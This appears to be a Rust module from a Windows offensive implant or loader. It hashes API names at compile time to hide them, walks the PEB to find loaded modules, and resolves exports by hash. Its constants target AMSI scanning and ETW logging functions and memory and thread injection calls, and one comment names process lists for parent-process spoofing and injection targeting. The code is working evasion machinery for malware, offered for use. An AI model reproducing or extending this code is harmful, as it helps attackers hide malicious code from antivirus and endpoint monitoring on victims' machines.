/// DJB2 hash — `const fn` so string literals are erased at compile time.
pub const fn djb2_hash(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < name.len() {
        h = h.wrapping_shl(5).wrapping_add(h).wrapping_add(name[i] as u32);
        i += 1;
    }
    h
}

/// Pre-computed hash constants — callers use these so no string literal survives in the binary.
pub mod h {
    use super::djb2_hash;
    use super::djb2_hash_lower;
    // NT syscalls
    pub const NT_ALLOC_VM:    u32 = djb2_hash(b"NtAllocateVirtualMemory");
    pub const NT_PROT_VM:     u32 = djb2_hash(b"NtProtectVirtualMemory");
    pub const NT_WRITE_VM:    u32 = djb2_hash(b"NtWriteVirtualMemory");
    pub const NT_QUERY_VM:    u32 = djb2_hash(b"NtQueryVirtualMemory");
    pub const NT_MAP_SEC:     u32 = djb2_hash(b"NtMapViewOfSection");
    pub const NT_UNMAP_SEC:   u32 = djb2_hash(b"NtUnmapViewOfSection");
    pub const NT_OPEN_SEC:    u32 = djb2_hash(b"NtOpenSection");
    pub const NT_OPEN_PROC:   u32 = djb2_hash(b"NtOpenProcess");
    pub const NT_OPEN_FILE:   u32 = djb2_hash(b"NtOpenFile");
    pub const NT_READ_FILE:   u32 = djb2_hash(b"NtReadFile");
    pub const NT_OPEN_TOK:    u32 = djb2_hash(b"NtOpenProcessToken");
    pub const NT_QI_TOKEN:    u32 = djb2_hash(b"NtQueryInformationToken");
    pub const NT_QI_PROC:     u32 = djb2_hash(b"NtQueryInformationProcess");
    pub const NT_QS_INFO:     u32 = djb2_hash(b"NtQuerySystemInformation");
    pub const NT_CREATE_THR:  u32 = djb2_hash(b"NtCreateThreadEx");
    pub const NT_GET_CTX:     u32 = djb2_hash(b"NtGetContextThread");
    pub const NT_SET_CTX:     u32 = djb2_hash(b"NtSetContextThread");
    pub const NT_WAIT_OBJ:    u32 = djb2_hash(b"NtWaitForSingleObject");
    pub const NT_DELAY:       u32 = djb2_hash(b"NtDelayExecution");
    pub const NT_CLOSE:       u32 = djb2_hash(b"NtClose");
    // ntdll exports
    pub const RTL_VEH:        u32 = djb2_hash(b"RtlAddVectoredExceptionHandler");
    pub const RTL_CRE_TQ:     u32 = djb2_hash(b"RtlCreateTimerQueue");
    pub const RTL_CRE_T:      u32 = djb2_hash(b"RtlCreateTimer");
    pub const RTL_DEL_TQ:     u32 = djb2_hash(b"RtlDeleteTimerQueueEx");
    pub const LDR_LOAD:       u32 = djb2_hash(b"LdrLoadDll");
    pub const RTL_USR_THR:    u32 = djb2_hash(b"RtlUserThreadStart");
    pub const LDRP_LOAD:      u32 = djb2_hash(b"LdrpLoadDll");
    pub const TP_ALLOC_W:     u32 = djb2_hash(b"TpAllocWork");
    pub const TP_POST_W:      u32 = djb2_hash(b"TpPostWork");
    pub const TP_REL_W:       u32 = djb2_hash(b"TpReleaseWork");
    // kernel32 exports
    pub const K32_BTI:        u32 = djb2_hash(b"BaseThreadInitThunk");
    pub const K32_LLEW:       u32 = djb2_hash(b"LoadLibraryExW");
    pub const K32_INIT_PTA:   u32 = djb2_hash(b"InitializeProcThreadAttributeList");
    pub const K32_UPD_PTA:    u32 = djb2_hash(b"UpdateProcThreadAttribute");
    pub const K32_DEL_PTA:    u32 = djb2_hash(b"DeleteProcThreadAttributeList");
    pub const K32_CREATE_PA:  u32 = djb2_hash(b"CreateProcessA");
    // amsi.dll exports
    pub const AMSI_SCAN_BUF:  u32 = djb2_hash(b"AmsiScanBuffer");
    pub const AMSI_SCAN_STR:  u32 = djb2_hash(b"AmsiScanString");
    pub const AMSI_OPEN_SES:  u32 = djb2_hash(b"AmsiOpenSession");
    // etw exports
    pub const ETW_EV_WRITE:   u32 = djb2_hash(b"EtwEventWrite");
    pub const ETW_EV_WR_FULL: u32 = djb2_hash(b"EtwEventWriteFull");
    // ole32 / combase exports
    pub const CO_INIT_EX:     u32 = djb2_hash(b"CoInitializeEx");
    pub const CO_CREATE_INST: u32 = djb2_hash(b"CoCreateInstance");
    // DLL name hashes — use h::DLL_* instead of djb2_hash_lower(b"xxx") in non-const callers
    pub const DLL_NTDLL:      u32 = djb2_hash_lower(b"ntdll.dll");
    pub const DLL_K32:        u32 = djb2_hash_lower(b"kernel32.dll");
    pub const DLL_KERNELBASE: u32 = djb2_hash_lower(b"kernelbase.dll");
    pub const DLL_OLE32:   u32 = djb2_hash_lower(b"ole32.dll");
    pub const DLL_AMSI:    u32 = djb2_hash_lower(b"amsi.dll");
    pub const DLL_VERSION: u32 = djb2_hash_lower(b"version.dll");
    pub const DLL_WINMM:   u32 = djb2_hash_lower(b"winmm.dll");
    pub const DLL_MPR:     u32 = djb2_hash_lower(b"mpr.dll");
    pub const DLL_WLDAP32: u32 = djb2_hash_lower(b"wldap32.dll");
    // Process name hashes for PPID spoofing / injection target selection
    pub const EXE_EXPLORER:       u32 = djb2_hash_lower(b"explorer.exe");
    pub const EXE_RT_BROKER:      u32 = djb2_hash_lower(b"runtimebroker.exe");
    pub const EXE_SIHOST:         u32 = djb2_hash_lower(b"sihost.exe");
    pub const EXE_SVCHOST:        u32 = djb2_hash_lower(b"svchost.exe");
    pub const EXE_SEARCH_INDEXER: u32 = djb2_hash_lower(b"searchindexer.exe");
    pub const EXE_ONEDRIVE:       u32 = djb2_hash_lower(b"onedrive.exe");
    pub const EXE_SEARCH_APP:     u32 = djb2_hash_lower(b"searchapp.exe");
}

/// Case-insensitive (ASCII) DJB2 hash — usable as `const` for compile-time module name hashes.
pub const fn djb2_hash_lower(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < name.len() {
        let c = name[i];
        let lo = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
        h = h.wrapping_shl(5).wrapping_add(h).wrapping_add(lo as u32);
        i += 1;
    }
    h
}

/// Walk PEB.Ldr.InLoadOrderModuleList and return the DllBase whose BaseDllName
/// (lowercased) matches `name_hash` (computed with `djb2_hash_lower`).
/// Avoids GetModuleHandle, leaving no call-site strings in the import table.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn peb_get_module_base(name_hash: u32) -> *const u8 {
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, readonly, preserves_flags),
    );
    if peb.is_null() { return core::ptr::null(); }

    // PEB.Ldr at +0x18; PEB_LDR_DATA.InLoadOrderModuleList at +0x10
    let ldr      = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() { return core::ptr::null(); }
    let head_ptr = ldr.add(0x10);           // address of the head LIST_ENTRY
    let mut node = *(head_ptr as *const *const u8); // first Flink (first real entry)

    while !node.is_null() && node != head_ptr {
        // LDR_DATA_TABLE_ENTRY (x64):
        //  +0x030  DllBase     *const u8
        //  +0x058  BaseDllName UNICODE_STRING { Length:u16, MaxLength:u16, pad:u32, Buffer:*u16 }
        let dll_base  = *(node.add(0x30) as *const *const u8);
        let name_len  = *(node.add(0x58) as *const u16) as usize;  // bytes
        let name_buf  = *(node.add(0x60) as *const *const u16);

        if !dll_base.is_null() && !name_buf.is_null() && name_len > 0 {
            let num_wchars = name_len / 2;
            let mut h: u32 = 5381;
            for i in 0..num_wchars {
                let wc = (*name_buf.add(i)) as u8;
                let lo = if wc >= b'A' && wc <= b'Z' { wc + 32 } else { wc };
                h = h.wrapping_shl(5).wrapping_add(h).wrapping_add(lo as u32);
            }
            if h == name_hash { return dll_base; }
        }
        node = *(node as *const *const u8); // follow InLoadOrderLinks.Flink
    }
    core::ptr::null()
}

/// Resolve a WinAPI address by hash from a loaded module.
/// Safety: base must be a valid PE image in memory.
#[cfg(target_os = "windows")]
pub unsafe fn resolve_by_hash(module_base: *const u8, target_hash: u32) -> Option<*const u8> {
    use core::slice;
    let e_lfanew = *(module_base.add(0x3C) as *const u32) as usize;
    let nt_base = module_base.add(e_lfanew);
    let optional_header = nt_base.add(0x18);
    let export_rva = *(optional_header.add(0x70) as *const u32) as usize;
    if export_rva == 0 { return None; }
    let export_dir = module_base.add(export_rva);
    let num_names     = *(export_dir.add(0x18) as *const u32) as usize;
    let names_rva     = *(export_dir.add(0x20) as *const u32) as usize;
    let ordinals_rva  = *(export_dir.add(0x24) as *const u32) as usize;
    let functions_rva = *(export_dir.add(0x1C) as *const u32) as usize;
    let names     = module_base.add(names_rva)     as *const u32;
    let ordinals  = module_base.add(ordinals_rva)  as *const u16;
    let functions = module_base.add(functions_rva) as *const u32;
    for i in 0..num_names {
        let name_rva  = *names.add(i) as usize;
        let name_ptr  = module_base.add(name_rva);
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let name_bytes = slice::from_raw_parts(name_ptr, len);
        if djb2_hash(name_bytes) == target_hash {
            let ordinal  = *ordinals.add(i) as usize;
            let func_rva = *functions.add(ordinal) as usize;
            return Some(module_base.add(func_rva));
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_known_values() {
        // Compute these values: djb2("NtAllocateVirtualMemory")
        // Don't hardcode — compute and verify:
        let nt_alloc = djb2_hash(b"NtAllocateVirtualMemory");
        let nt_prot  = djb2_hash(b"NtProtectVirtualMemory");
        let amsi     = djb2_hash(b"AmsiScanBuffer");
        // Verify they're nonzero and stable (same input = same output)
        assert_eq!(nt_alloc, djb2_hash(b"NtAllocateVirtualMemory"));
        assert_eq!(nt_prot,  djb2_hash(b"NtProtectVirtualMemory"));
        assert_eq!(amsi,     djb2_hash(b"AmsiScanBuffer"));
        // Verify different names produce different hashes
        assert_ne!(nt_alloc, nt_prot);
        assert_ne!(nt_alloc, amsi);
    }
}
